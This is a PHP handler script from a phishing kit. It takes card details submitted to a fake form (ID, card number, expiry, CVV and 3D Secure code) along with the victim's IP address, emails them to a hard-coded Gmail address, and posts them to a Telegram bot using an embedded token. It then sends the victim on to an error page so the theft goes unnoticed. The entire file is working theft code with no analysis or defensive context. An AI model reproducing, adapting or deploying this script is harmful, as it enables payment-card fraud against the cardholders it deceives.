<?php   ob_start();  ?>
<?
include "boss.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX SAISON Xx======\n";
$message .= "ID               : ".$_POST['jp1']."\n";
$message .= "CC               : ".$_POST['jp2']."\n";
$message .= "MONTH                  : ".$_POST['jp3']."\n";
$message .= "YERD               : ".$_POST['jp4']."\n";
$message .= "CVV                  : ".$_POST['jp5']."\n";
$message .= "3D                  : ".$_POST['jp6']."\n";
$message .= "============xX Majid NEXI Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "==================================================\n";

$send="omex1231231@gmail.com";
$subject = "Login | ".$_POST['winners1']." | $ip";
$headers = "From: Kelly<noreply>";
@mail($send,$subject,$message,$from);

$website="https://api.telegram.org/bot1080168055:AAFVrwSmPVa67EVEcKWvCPAQUINbPE9vKdg";
$chatId=1234567;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-343481056',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


@header("Location: ./error.php");